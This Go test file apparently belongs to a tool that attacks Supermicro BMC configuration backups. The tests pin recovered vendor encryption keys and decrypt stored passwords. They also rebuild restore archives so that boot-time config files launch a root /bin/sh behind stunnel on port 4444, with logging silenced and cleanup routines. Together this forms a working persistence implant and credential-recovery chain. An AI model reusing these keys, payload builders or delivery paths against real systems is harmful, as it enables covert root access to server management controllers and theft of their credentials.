package ipmi

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"os"
	"os/exec"
	"slices"
	"strings"
	"testing"
)

func TestNewSMCConfigXferUsesConservativeChunks(t *testing.T) {
	xfer := NewSMCConfigXfer(nil)
	if xfer.DownloadChunk != 500 || xfer.UploadChunk != 500 {
		t.Errorf("default chunks = download %d, upload %d; want 500 each", xfer.DownloadChunk, xfer.UploadChunk)
	}
}

func TestSMCDecryptPSBlockRawAndArchive(t *testing.T) {
	plaintext := append([]byte("ADMIN"), bytes.Repeat([]byte{11}, 11)...)
	block, err := aes.NewCipher(SMCAtRestKey)
	if err != nil {
		t.Fatal(err)
	}
	ciphertext := make([]byte, aes.BlockSize)
	cipher.NewCBCEncrypter(block, SMCAtRestIV).CryptBlocks(ciphertext, plaintext)
	store := append(bytes.Repeat([]byte{0xff}, 7), ciphertext...)

	got, err := SMCDecryptPSBlock(store)
	if err != nil || len(got) != 1 || got[0].Offset != 7 || got[0].Plaintext != "ADMIN" {
		t.Fatalf("raw PSBlock = %+v, err=%v", got, err)
	}
	archive := buildTestArchive(t, map[string]string{"PSBlock": string(store)})
	got, err = SMCRecoverPasswords(archive)
	if err != nil || len(got) != 1 || got[0].Plaintext != "ADMIN" {
		t.Fatalf("archive PSBlock = %+v, err=%v", got, err)
	}
}

// (mustHex is provided by hashcat_test.go in this package.)

// TestSMCContainerKnownAnswer checks the container crypto against a vector
// produced independently by the openssl CLI with the recovered X11 key and the
// built-in IV, so a regression in the Go wrap/unwrap is caught cross-impl.
func TestSMCContainerKnownAnswer(t *testing.T) {
	key := mustHex("a22874547aba7a32cf8ac49c1896722f") // recovered X11 fleet key
	pt := mustHex("6f6f627363616e2d736d632d6b61740a68656c6c6f2070726573657276655f636f6e6669670a")
	ct := mustHex("474064563f1772af663cf891f2c382cc36f2be54df609c5394ba0c001163bad78cca9286dc5582df46ad9a81e9cee55f")

	// The built-in IV must match the vector's IV.
	if got := hex.EncodeToString(SMCObfuscationIV); got != "2e7b4c71d0452a6b89b89af96ab3c6ca" {
		t.Fatalf("SMCObfuscationIV = %s, want the built-in ATEN IV", got)
	}

	// Unwrap the openssl-produced ciphertext.
	gotPT, crcOK, err := SMCContainerUnwrap(ct, key, SMCObfuscationIV, SMCCipherAES128CBC)
	if err != nil {
		t.Fatalf("unwrap: %v", err)
	}
	if !crcOK {
		t.Errorf("crcOK = false, want true")
	}
	if !bytes.Equal(gotPT, pt) {
		t.Errorf("unwrap plaintext mismatch\n got %x\nwant %x", gotPT, pt)
	}

	// Wrap must reproduce the exact ciphertext.
	gotCT, err := SMCContainerWrap(pt, key, SMCObfuscationIV, SMCCipherAES128CBC)
	if err != nil {
		t.Fatalf("wrap: %v", err)
	}
	if !bytes.Equal(gotCT, ct) {
		t.Errorf("wrap ciphertext mismatch\n got %x\nwant %x", gotCT, ct)
	}
}

// TestSMCContainer3DESKnownAnswer checks the 3DES-EDE3-CBC path (X10 and the
// kohandler generations) against an openssl-produced vector with the recovered
// X10 key and a zero IV.
func TestSMCContainer3DESKnownAnswer(t *testing.T) {
	key := mustHex("f1da33a298120612060792ffaa998811998877445588aabb") // X10 3DES key (24B)
	iv := make([]byte, 8)
	pt := mustHex("6f6f627363616e2d7831302d336465732d6b61740a70726573657276655f636f6e6669670a")
	ct := mustHex("8bc72e62ac2935ed5406b5726c959d693be1e536d7c37696055d3d0fcaa47502da66a24e77b1c7fe31a256a9aefd3886")

	gotPT, crcOK, err := SMCContainerUnwrap(ct, key, iv, SMCCipher3DESCBC)
	if err != nil {
		t.Fatalf("unwrap: %v", err)
	}
	if !crcOK || !bytes.Equal(gotPT, pt) {
		t.Errorf("3DES unwrap mismatch: crcOK=%v\n got %x\nwant %x", crcOK, gotPT, pt)
	}
	gotCT, err := SMCContainerWrap(pt, key, iv, SMCCipher3DESCBC)
	if err != nil {
		t.Fatalf("wrap: %v", err)
	}
	if !bytes.Equal(gotCT, ct) {
		t.Errorf("3DES wrap mismatch\n got %x\nwant %x", gotCT, ct)
	}
}

func TestSMCContainerRoundTripAndWrongKey(t *testing.T) {
	pt := bytes.Repeat([]byte("preserve_config/"), 100)
	cases := []struct {
		name   string
		key    []byte
		iv     []byte
		wrong  []byte
		cipher SMCConfigCipher
	}{
		{"aes", mustHex("a22874547aba7a32cf8ac49c1896722f"), SMCObfuscationIV, mustHex("00112233445566778899aabbccddeeff"), SMCCipherAES128CBC},
		{"3des", mustHex("f1da33a298120612060792ffaa998811998877445588aabb"), make([]byte, 8), mustHex("001122334455667788990011223344556677889900112233"), SMCCipher3DESCBC},
	}
	for _, tc := range cases {
		ct, err := SMCContainerWrap(pt, tc.key, tc.iv, tc.cipher)
		if err != nil {
			t.Fatalf("%s wrap: %v", tc.name, err)
		}
		got, crcOK, err := SMCContainerUnwrap(ct, tc.key, tc.iv, tc.cipher)
		if err != nil || !crcOK || !bytes.Equal(got, pt) {
			t.Fatalf("%s round trip failed: crcOK=%v err=%v equal=%v", tc.name, crcOK, err, bytes.Equal(got, pt))
		}
		// A wrong key must not report crcOK.
		if _, crcOK, _ := SMCContainerUnwrap(ct, tc.wrong, tc.iv, tc.cipher); crcOK {
			t.Errorf("%s: wrong key reported crcOK=true", tc.name)
		}
	}
}

func TestSMCCryptoProfileForGeneration(t *testing.T) {
	// Pin the recovered profiles so a typo regresses.
	want := map[string]struct {
		cipher SMCConfigCipher
		key    string
		ivLen  int
	}{
		"X11": {SMCCipherAES128CBC, "a22874547aba7a32cf8ac49c1896722f", 16},
		"X10": {SMCCipher3DESCBC, "f1da33a298120612060792ffaa998811998877445588aabb", 8},
		"H13": {SMCCipherAES128CBC, "ba8cc4a492d2c24aafa2143c48de8a2f", 16},
	}
	for gen, w := range want {
		p, ok := SMCCryptoProfileForGeneration(gen)
		if !ok {
			t.Errorf("%s: no profile", gen)
			continue
		}
		if p.Cipher != w.cipher || hex.EncodeToString(p.Key) != w.key || len(p.IV) != w.ivLen {
			t.Errorf("%s profile wrong: cipher=%s key=%s ivlen=%d", gen, p.Cipher, hex.EncodeToString(p.Key), len(p.IV))
		}
	}
	if _, ok := SMCCryptoProfileForGeneration("x10"); !ok { // case-insensitive
		t.Errorf("case-insensitive lookup failed")
	}
	if _, ok := SMCCryptoProfileForGeneration("X99"); ok {
		t.Errorf("unknown generation returned a profile")
	}
	p, _ := SMCCryptoProfileForGeneration("X11")
	// Returned slices must be copies (mutating must not poison the table).
	p.Key[0] ^= 0xff
	if p2, _ := SMCCryptoProfileForGeneration("X11"); p2.Key[0] == p.Key[0] {
		t.Errorf("SMCCryptoProfileForGeneration leaked the backing array")
	}
}

// buildTestArchive makes a minimal gzip tar shaped like a real backup:
// ./preserve_config/ dir + a couple of files, root-owned, GNU format.
func buildTestArchive(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(zw)
	dir := &tar.Header{Name: smcArchivePrefix, Typeflag: tar.TypeDir, Mode: 0o755, Format: tar.FormatGNU}
	if err := tw.WriteHeader(dir); err != nil {
		t.Fatal(err)
	}
	for name, body := range files {
		h := &tar.Header{
			Name: smcArchivePrefix + name, Typeflag: tar.TypeReg,
			Mode: 0o644, Size: int64(len(body)), Uname: "root", Gname: "root",
			Format: tar.FormatGNU,
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func TestSMCRebuildArchiveAppendAndAdd(t *testing.T) {
	src := buildTestArchive(t, map[string]string{
		"syslog.conf": "PORT1=514\nSLOG_SERVICE=1\n",
		"ps.xml":      "<root/>",
	})
	edit := SMCArchiveEdit{
		Append: map[string][]byte{"syslog.conf": []byte("# launcher\n")},
		Add:    map[string][]byte{"dbgsvc.conf": []byte("#!/bin/sh\n")},
	}
	out, rep, err := SMCRebuildArchive(src, edit)
	if err != nil {
		t.Fatalf("rebuild: %v", err)
	}
	if len(rep.Appended) != 1 || rep.Appended[0] != "syslog.conf" {
		t.Errorf("appended = %v", rep.Appended)
	}
	if len(rep.Added) != 1 || rep.Added[0] != "dbgsvc.conf" {
		t.Errorf("added = %v", rep.Added)
	}

	// syslog.conf must retain its original content plus the appended bytes.
	sc, ok, err := SMCArchiveMember(out, "syslog.conf")
	if err != nil || !ok {
		t.Fatalf("member syslog.conf: ok=%v err=%v", ok, err)
	}
	if !strings.Contains(string(sc), "SLOG_SERVICE=1") || !strings.Contains(string(sc), "# launcher") {
		t.Errorf("syslog.conf lost content or append: %q", sc)
	}

	// dbgsvc.conf must be present and root-owned (inherited from the template).
	names, err := SMCArchiveMemberNames(out)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(names, smcArchivePrefix+"dbgsvc.conf") {
		t.Errorf("dbgsvc.conf missing from %v", names)
	}
	members, err := smcReadArchive(out)
	if err != nil {
		t.Fatal(err)
	}
	for _, m := range members {
		if m.hdr.Name == smcArchivePrefix+"dbgsvc.conf" {
			if m.hdr.Uid != 0 || m.hdr.Gid != 0 {
				t.Errorf("added member uid/gid = %d/%d, want 0/0", m.hdr.Uid, m.hdr.Gid)
			}
		}
	}
}

func TestSMCRebuildArchiveRefusesAddingExisting(t *testing.T) {
	src := buildTestArchive(t, map[string]string{"syslog.conf": "x"})
	_, _, err := SMCRebuildArchive(src, SMCArchiveEdit{
		Add: map[string][]byte{"syslog.conf": []byte("y")},
	})
	if err == nil {
		t.Errorf("expected refusal to --add an existing member")
	}
}

func TestSMCRebuildArchiveUpsert(t *testing.T) {
	// Upsert must replace an existing member in place, and add an absent one.
	src := buildTestArchive(t, map[string]string{"phase2d.conf": "stale-inert-stub", "keep.conf": "k"})
	out, rep, err := SMCRebuildArchive(src, SMCArchiveEdit{
		Upsert: map[string][]byte{
			"phase2d.conf": []byte("fresh-binary"),
			"new.conf":     []byte("fresh-config"),
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(rep.Replaced, "phase2d.conf") {
		t.Errorf("phase2d.conf not in Replaced: %v", rep.Replaced)
	}
	if !slices.Contains(rep.Added, "new.conf") {
		t.Errorf("new.conf not in Added: %v", rep.Added)
	}
	members, err := smcReadArchive(out)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, m := range members {
		got[smcMemberKey(m.hdr.Name)] = string(m.data)
	}
	if got["phase2d.conf"] != "fresh-binary" {
		t.Errorf("phase2d.conf = %q, want fresh-binary", got["phase2d.conf"])
	}
	if got["new.conf"] != "fresh-config" {
		t.Errorf("new.conf = %q, want fresh-config", got["new.conf"])
	}
	if got["keep.conf"] != "k" {
		t.Errorf("keep.conf = %q, want k (untouched)", got["keep.conf"])
	}
}

func TestSMCRebuildArchiveNoPAX(t *testing.T) {
	// busybox 1.23.1 rejects PAX; the rebuilt archive must be GNU/ustar.
	src := buildTestArchive(t, map[string]string{"a.conf": "1", "b.conf": "2"})
	out, _, err := SMCRebuildArchive(src, SMCArchiveEdit{Add: map[string][]byte{"c.conf": []byte("3")}})
	if err != nil {
		t.Fatal(err)
	}
	zr, err := gzip.NewReader(bytes.NewReader(out))
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(mustReadAll(t, zr), []byte("PaxHeader")) {
		t.Errorf("rebuilt archive contains PAX headers")
	}
}

func TestSMCShellPayloadShape(t *testing.T) {
	cur := []byte("PORT1=514\nSLOG_SERVICE=1\nSERVER1=192.0.2.9\n")

	cert, err := GenerateSMCShellClientCert("")
	if err != nil {
		t.Fatalf("client cert: %v", err)
	}
	// The cert is pinned as its own CA under stunnel `verify = 4`, which requires
	// the presented cert to be byte-identical to CAfile rather than merely signed
	// by it. So it must carry KeyUsageCertSign and CA:TRUE, or OpenSSL rejects it
	// as its own issuer ("unable to get local issuer certificate").
	blk, _ := pem.Decode(cert.CertPEM)
	if blk == nil {
		t.Fatal("client cert PEM did not decode")
	}
	parsed, err := x509.ParseCertificate(blk.Bytes)
	if err != nil {
		t.Fatalf("parse client cert: %v", err)
	}
	if parsed.KeyUsage&x509.KeyUsageCertSign == 0 {
		t.Errorf("client cert lacks KeyUsageCertSign; verify=4 pinning will fail")
	}
	if !parsed.IsCA {
		t.Errorf("client cert must be CA:TRUE to be pinned as its own issuer")
	}

	svc := BuildSMCShellServiceConf(SMCShellService{Port: 4444, CACertPEM: cert.CertPEM})
	for _, want := range []string{"DBG_PORT=4444", "accept = $DBG_PORT", "verify = 4", "exec = /bin/sh", "execargs = sh $EXEC", "pty = yes", "exec /bin/sh 2>&1", "BEGIN CERTIFICATE"} {
		if !bytes.Contains(svc, []byte(want)) {
			t.Errorf("service payload missing %q", want)
		}
	}
	if bytes.Contains(svc, []byte("telnetd")) {
		t.Error("stunnel service must not start an unauthenticated Telnet fallback")
	}
	// The generated config must not accidentally contain a Go raw-string
	// terminator that would have truncated it.
	if bytes.Contains(svc, []byte("verifyPeer")) {
		t.Errorf("service should use numeric verify=4 (works on 4.56 and 5.x), not verifyPeer")
	}
	// The service must write only to tmpfs at runtime (it may read the cert from
	// /nv), so cleanup is just reverting syslog.conf + reboot -- no /nv writes.
	// The supervisor log and stunnel debug are silenced (LOG=/dev/null, debug=0)
	// so no /tmp log grows on the board.
	if !bytes.Contains(svc, []byte("LOG=/dev/null")) || bytes.Contains(svc, []byte("output =")) {
		t.Errorf("service must silence the supervisor log and keep no stunnel output file")
	}
	if bytes.Contains(svc, []byte("debug = 4")) {
		t.Errorf("service must disable stunnel debug verbosity (debug = 0)")
	}

	// Self-contained payload: the whole service is embedded in syslog.conf, written
	// to tmpfs at boot and launched backgrounded. It must not depend on a second
	// /nv file landing -- the X10 restore copy list drops a separate dbgsvc.conf,
	// which left the old split payload inert.
	sc := BuildSMCShellSyslogConf(cur, svc)
	if !bytes.HasPrefix(sc, cur) {
		t.Errorf("syslog payload must preserve current content as a prefix")
	}
	if !bytes.Contains(sc, svc) {
		t.Errorf("syslog payload must embed the full service verbatim")
	}
	if !bytes.Contains(sc, []byte("cat > "+smcShellTmpServicePath)) {
		t.Errorf("syslog payload must write the service to tmpfs")
	}
	if !bytes.Contains(sc, []byte("/bin/sh "+smcShellTmpServicePath+" </dev/null >/dev/null 2>&1 &")) {
		t.Errorf("syslog payload must run the tmpfs service backgrounded")
	}
	if bytes.Contains(sc, []byte("[ -f /nv/"+SMCShellServiceConfName+" ]")) {
		t.Errorf("syslog payload must not depend on a separate /nv/%s (fails on X10)", SMCShellServiceConfName)
	}

	if cert.Fingerprint == "" || !strings.Contains(cert.Fingerprint, ":") {
		t.Errorf("fingerprint not formatted: %q", cert.Fingerprint)
	}
}

func TestSMCShellOutputBeforeMarker(t *testing.T) {
	const marker = "__OOBSCAN_SHELL_DONE__"
	for _, tt := range []struct {
		name  string
		input string
		want  string
		found bool
	}{
		{name: "raw shell output", input: "result\n" + marker + "\n", want: "result\n", found: true},
		{name: "pty echo then output", input: "echo " + marker + "\r\nresult\r\n" + marker + "\r\n", want: "echo " + marker + "\r\nresult\r\n", found: true},
		{name: "marker at EOF", input: "result\n" + marker, want: "result\n", found: true},
		{name: "absent", input: "result\n", want: "result\n"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			got, found := smcShellOutputBeforeMarker(tt.input, marker)
			if got != tt.want || found != tt.found {
				t.Errorf("smcShellOutputBeforeMarker(%q) = (%q, %t), want (%q, %t)", tt.input, got, found, tt.want, tt.found)
			}
		})
	}
}

// TestSMCShellNetconfigPayload guards the older-X10 delivery vector: the launcher
// appended to /nv/network/netconfig0, which network6 `source`s as root at boot and
// then keeps configuring the interface. The append must preserve the original
// network variables and must be wrapped so it cannot abort the sourcing shell
// (which would drop the unit off the network).
func TestSMCShellNetconfigPayload(t *testing.T) {
	cur := []byte("#version-1.00\nINTERFACE0=1\nDEVICE0=\"eth0\"\nIPV6ADDRLIST0=\"\"\n")
	cert, err := GenerateSMCShellClientCert("")
	if err != nil {
		t.Fatalf("client cert: %v", err)
	}
	svc := BuildSMCShellServiceConf(SMCShellService{Port: 4444, CACertPEM: cert.CertPEM})
	nc := BuildSMCShellNetconfig(cur, svc)

	// Original network variables must survive verbatim (append-only).
	for _, want := range []string{"INTERFACE0=1", "DEVICE0=\"eth0\"", "IPV6ADDRLIST0=\"\""} {
		if !bytes.Contains(nc, []byte(want)) {
			t.Errorf("netconfig payload dropped original variable %q", want)
		}
	}
	// The current content must be a prefix: nothing is inserted above the vars.
	if !bytes.HasPrefix(nc, cur) {
		t.Errorf("netconfig payload must preserve the original file as a prefix")
	}
	// The launcher must be a backgrounded subshell so network6 regains control and
	// no exit inside it reaches the sourcing shell.
	if !bytes.Contains(nc, []byte("( cat > "+smcShellTmpServicePath)) {
		t.Errorf("netconfig launcher must open a subshell around the payload")
	}
	if !bytes.Contains(nc, []byte(") </dev/null >/dev/null 2>&1 &")) {
		t.Errorf("netconfig launcher subshell must be backgrounded")
	}
	// Idempotent re-deploy: feeding a prior result back in must not stack blocks.
	nc2 := BuildSMCShellNetconfig(nc, svc)
	if bytes.Count(nc2, []byte(smcShellLauncherMarker)) != 1 {
		t.Errorf("re-deploy stacked launcher blocks: got %d markers", bytes.Count(nc2, []byte(smcShellLauncherMarker)))
	}

	// It must parse cleanly: a syntax error here would break network6 at boot.
	// The whole point of the subshell wrap + the quoted service here-doc is that
	// `sh -n` over the appended file succeeds.
	if sh, lerr := exec.LookPath("sh"); lerr == nil {
		f, ferr := os.CreateTemp(t.TempDir(), "nc-*.sh")
		if ferr != nil {
			t.Fatalf("temp: %v", ferr)
		}
		f.Write(nc)
		f.Close()
		if out, cerr := exec.Command(sh, "-n", f.Name()).CombinedOutput(); cerr != nil {
			t.Errorf("rebuilt netconfig0 failed `sh -n`: %v: %s", cerr, out)
		}
	}
}

// TestSMCShellDDNSPayload guards the X10 FW ~3.5x delivery vector: the launcher
// appended to /nv/ddns/DDNS_CONFIG, which ddns_update.sh `source`s as root before
// its enable check. The append must preserve the original DDNS variables and must
// be a backgrounded subshell so it cannot block or exit the sourcing script.
func TestSMCShellDDNSPayload(t *testing.T) {
	cur := []byte("enable=\"false\"\nkeyname=\"ddns.key\"\ndns_server=\"0.0.0.0\"\n")
	cert, err := GenerateSMCShellClientCert("")
	if err != nil {
		t.Fatalf("client cert: %v", err)
	}
	svc := BuildSMCShellServiceConf(SMCShellService{Port: 4444, CACertPEM: cert.CertPEM})
	nc := BuildSMCShellDDNSConf(cur, svc)

	// Original DDNS variables must survive verbatim (append-only), as a prefix.
	for _, want := range []string{"enable=\"false\"", "keyname=\"ddns.key\"", "dns_server=\"0.0.0.0\""} {
		if !bytes.Contains(nc, []byte(want)) {
			t.Errorf("DDNS payload dropped original variable %q", want)
		}
	}
	if !bytes.HasPrefix(nc, cur) {
		t.Errorf("DDNS payload must preserve the original file as a prefix")
	}
	// Backgrounded subshell, so ddns_update.sh regains control immediately.
	if !bytes.Contains(nc, []byte("( cat > "+smcShellTmpServicePath)) {
		t.Errorf("DDNS launcher must open a subshell around the payload")
	}
	if !bytes.Contains(nc, []byte(") </dev/null >/dev/null 2>&1 &")) {
		t.Errorf("DDNS launcher subshell must be backgrounded")
	}
	// Idempotent re-deploy.
	nc2 := BuildSMCShellDDNSConf(nc, svc)
	if bytes.Count(nc2, []byte(smcShellLauncherMarker)) != 1 {
		t.Errorf("re-deploy stacked launcher blocks: got %d markers", bytes.Count(nc2, []byte(smcShellLauncherMarker)))
	}
	// Must parse cleanly under `sh -n`.
	if sh, lerr := exec.LookPath("sh"); lerr == nil {
		f, ferr := os.CreateTemp(t.TempDir(), "ddns-*.sh")
		if ferr != nil {
			t.Fatalf("temp: %v", ferr)
		}
		f.Write(nc)
		f.Close()
		if out, cerr := exec.Command(sh, "-n", f.Name()).CombinedOutput(); cerr != nil {
			t.Errorf("rebuilt DDNS_CONFIG failed `sh -n`: %v: %s", cerr, out)
		}
	}
}

func TestSMCServiceCleanup(t *testing.T) {
	const vendorConfig = "PORT1=514\nSLOG_SERVICE=0\n"
	for _, markers := range [][]string{
		{smcTailnetLauncherMarker},
		{smcTailnetLegacyMarker},
		{smcShellLauncherMarker},
		{smcShellLegacyLauncherMarker},
		{smcTailnetLauncherMarker, smcShellLauncherMarker},
		{smcShellLauncherMarker, smcTailnetLegacyMarker},
	} {
		t.Run(strings.Join(markers, "/"), func(t *testing.T) {
			config := []byte(vendorConfig + "\n" + strings.Join(markers, "\nservice\n") + "\nservice\n")
			cleaned, tailnetRemoved := StripSMCTailnetLauncher(config)
			cleaned, shellRemoved := StripSMCDebugShellLauncher(cleaned)
			if !tailnetRemoved && !shellRemoved {
				t.Fatal("no deployment launcher removed")
			}
			if string(cleaned) != vendorConfig {
				t.Errorf("cleanup = %q, want %q", cleaned, vendorConfig)
			}
		})
	}
	for _, strip := range []func([]byte) ([]byte, bool){StripSMCTailnetLauncher, StripSMCDebugShellLauncher} {
		cleaned, removed := strip([]byte(vendorConfig))
		if removed || string(cleaned) != vendorConfig {
			t.Errorf("unmodified config changed: %q, removed=%v", cleaned, removed)
		}
	}
}

// TestSMCOpenSSLSaltedRoundTrip round-trips the older-X10 inner config layer (the
func TestSMCOpenSSLSaltedRoundTrip(t *testing.T) {
	// A small gzip so looksGzip is meaningful.
	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	zw.Write([]byte("PORT1=514\nSLOG_SERVICE=0\n"))
	zw.Close()
	plain := gz.Bytes()
	pass := []byte("placeholder-not-the-real-secret")

	blob, err := SMCOpenSSLSaltedWrap(plain, pass)
	if err != nil {
		t.Fatalf("wrap: %v", err)
	}
	if !SMCLooksOpenSSLSalted(blob) {
		t.Fatalf("wrapped blob lacks the Salted__ magic")
	}
	got, looksGzip, err := SMCOpenSSLSaltedUnwrap(blob, pass)
	if err != nil {
		t.Fatalf("unwrap: %v", err)
	}
	if !looksGzip || !bytes.Equal(got, plain) {
		t.Fatalf("round trip mismatch: looksGzip=%v len(got)=%d len(plain)=%d", looksGzip, len(got), len(plain))
	}
	// Wrong password must not reproduce the plaintext.
	if bad, _, _ := SMCOpenSSLSaltedUnwrap(blob, []byte("wrong")); bytes.Equal(bad, plain) {
		t.Fatalf("wrong password decrypted to the correct plaintext")
	}
}

// TestSMCDoubleLayerRebuildRoundTrip exercises the full older-X10 layering that
// smc-restore-shell must reproduce: a gzip tar wrapped in the inner
// openssl-enc-salted layer, then the outer obfuscation container. It peels both
// layers back and confirms the member survives.
func TestSMCDoubleLayerRebuildRoundTrip(t *testing.T) {
	base := buildTestArchive(t, map[string]string{SMCShellSyslogConfName: "PORT1=514\n"})
	pass := []byte("inner-secret")
	key := mustHex("a22874547aba7a32cf8ac49c1896722f")
	iv := SMCObfuscationIV

	innerBlob, err := SMCOpenSSLSaltedWrap(base, pass)
	if err != nil {
		t.Fatalf("inner wrap: %v", err)
	}
	ct, err := SMCContainerWrap(innerBlob, key, iv, SMCCipherAES128CBC)
	if err != nil {
		t.Fatalf("container wrap: %v", err)
	}

	pt, crcOK, err := SMCContainerUnwrap(ct, key, iv, SMCCipherAES128CBC)
	if err != nil || !crcOK {
		t.Fatalf("container unwrap: crcOK=%v err=%v", crcOK, err)
	}
	if !SMCLooksOpenSSLSalted(pt) {
		t.Fatalf("inner is not Salted__")
	}
	inner, gz, err := SMCOpenSSLSaltedUnwrap(pt, pass)
	if err != nil || !gz {
		t.Fatalf("inner unwrap: gzip=%v err=%v", gz, err)
	}
	if !bytes.Equal(inner, base) {
		t.Fatalf("double-layer round trip lost data")
	}
	got, ok, err := SMCArchiveMember(inner, SMCShellSyslogConfName)
	if err != nil || !ok || !bytes.Equal(got, []byte("PORT1=514\n")) {
		t.Fatalf("member mismatch: ok=%v err=%v got=%q", ok, err, got)
	}
}

func TestSMCShellClientCertRoundTrip(t *testing.T) {
	cert, err := GenerateSMCShellClientCert("oobscan-test-client")
	if err != nil {
		t.Fatalf("generate: %v", err)
	}
	combined := append(append([]byte{}, cert.CertPEM...), cert.KeyPEM...)

	got, err := ParseSMCShellClientCert(combined)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if got.Fingerprint != cert.Fingerprint {
		t.Errorf("fingerprint mismatch: got %q, want %q", got.Fingerprint, cert.Fingerprint)
	}
	if got.CommonName != cert.CommonName {
		t.Errorf("common name mismatch: got %q, want %q", got.CommonName, cert.CommonName)
	}
	if !bytes.Equal(got.KeyPEM, cert.KeyPEM) {
		t.Errorf("key PEM not preserved through round trip")
	}

	if _, err := ParseSMCShellClientCert([]byte("not a pem file")); err == nil {
		t.Errorf("expected error parsing garbage input")
	}
	if _, err := ParseSMCShellClientCert(cert.CertPEM); err == nil {
		t.Errorf("expected error parsing cert-only input (missing key)")
	}
}

func mustReadAll(t *testing.T, r *gzip.Reader) []byte {
	t.Helper()
	var buf bytes.Buffer
	if _, err := buf.ReadFrom(r); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}
